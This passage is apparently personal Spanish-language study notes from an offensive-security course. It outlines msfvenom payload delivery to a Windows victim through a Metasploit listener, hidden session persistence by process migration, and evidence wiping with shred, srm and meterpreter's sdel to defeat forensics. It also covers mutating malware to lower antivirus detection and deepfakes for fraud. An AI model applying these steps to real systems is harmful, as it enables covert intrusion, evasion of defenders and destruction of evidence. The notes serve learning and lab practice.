-b que omita los simbolos dentro de las ""para omitir errores, -f que salga es decir el ouput sea tipo .exe y -o el nombre de como saldra
le pasamos el archivo cifrado a la maquina windows previamente teniendo la maquina kali escuchando a traves de metasploit con use exploit/multi/handler
usamos el payload del msfvenom y el puerto, una vez el progama este ubicado en la maquina victima lo ejecutamos y ya tendriamos nuestra primera session

Como mantener una session aunque la victima cierre el porgrama anterior o cierre el vinculo por donde entre pues con el siguiente comando
estando ya dentro con meterpreter ejecuto run post/windows/manage/migrate, esto cerrara el programa anterior y nos creara una session oculta
Otra forma de mover de kali a windows upload /home/kali/Desktop/pueba.txt C:\\Users\kali\Downloads

formas de borrar evidencia
primera herramienta es shred
luego de verificar shred --h vemos las opciones, en este caso utilizaremos shred -vfz para borrar un fichero .txt creado que contenga HOLA
luego de shred -vfz ejemplo.txt, ya no tendra nada, se abra borrado y no dejara rastros en la memoria que es lo que buscamos , ya que si realizan
un anailisis en la maquina victima y revisan la memoria encontraran nuestros pasos, este ejemplo anterior elimino el rastro del archivo, mas sin embargo
no lo borro pero no dejo en su interior rastro alguno

Otra herramienta para eliminar rastro es srm
por supuesto consultar srm -h, en este caso solo srm ejemplo.txt, este si lo borra por completo incluyendo el fichero
al igual que srm -v ejemplo.txt, u otras opciones mas especificas

para ver donde podemos haber dejado rastros > guias de analisis forenses 

Formas de borrar evidencias o borrar archivos sin dejar evidencia dentro de meterpreter
Utilizamos la herramienta run > run post/windows/manage/sdel y le colocamos la direccion del archivo a borrar en este caso
FILE=C:\\Users\\kali\\Desktop\\Borrame.txt

Uso de herramienta batea
esta sirve para identificar por ejemplo en una empresa con multiples maquina cual host deberiamos de analizar primero en caso de que todos hayan sido atacados
luego de analizar nuestras dos maquinas mas vulnerables nuestras dos metasplit, ubuntu y windows metasploitable con nmap -O -sV ip.0/24 -oX output.xml
luego decimos que sudo batea -n 2 output.xml , -n nos preguntas cuantos hots desea que analice y decimos 2 hosts deben de tener mas prioridad
recordad que batea utiliza machine learning

Otra herramienta es pisidious, esta herramienta toma nuestro malware lo convierte en un nuevo archivo y unas de sus opciones nos indica el nivel de 
porcentaje que este viene y cual es el porcentaje que el antivirus lo podra detectar, de igual forma verficiar su funcionamiento ya que esta 
herramienta mide el nivel del malware
python3.6 classifier.py -d /home/vboxuser/Escritorio/putty > nos muestra la informacion del malware, su nivel de amenaza y si lo es por supuesto
python3.6 classifier.py -d direccion que nos muestra con el nuevo malware y veremos que el porcentaje baja y en vez de verlo como malware su nivel sera de malicioso


Otra herramienta es deep fake se trata de una suplantacion de identidad de rostro que se utiliza en la ingenieria social y que aparte del rostro tambien, correos
electronicos, videos, fotos, demas, para hacerce pasar por otra persona y cometer un fraude

mitre att&ck > formas de atacar o formas de realizar un hack
